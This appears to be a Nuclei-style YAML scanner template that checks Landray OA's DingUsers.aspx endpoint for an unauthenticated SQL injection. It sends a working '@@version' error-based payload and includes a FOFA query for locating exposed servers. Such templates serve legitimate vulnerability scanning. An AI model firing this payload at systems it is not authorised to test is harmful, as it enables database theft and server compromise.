http:
    - matchers:
        - dsl:
            - status_code==500 && contains_all(body,"Microsoft","SQL Server")
          name: SQL注入
          type: dsl
      raw:
        - |
          GET /SM/DingUsers.aspx?id=1%20and%201=@@version--i HTTP/1.1
          Host: {{Hostname}}
          Accept: */*
          Connection: close
id: Landray-OA-DingUsers_aspx-SQL
info:
    author: HuanXiong
    description: |-
        fofa: body="/Scripts/jquery.landray.dialog.js"
        蓝凌OA DingUsers.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 蓝凌 OA DingUsers.aspx SQL注入
    reference:
        - null
    severity: high
    tags:
        - 蓝凌oa
        - jQuery
        - LandRay-OA
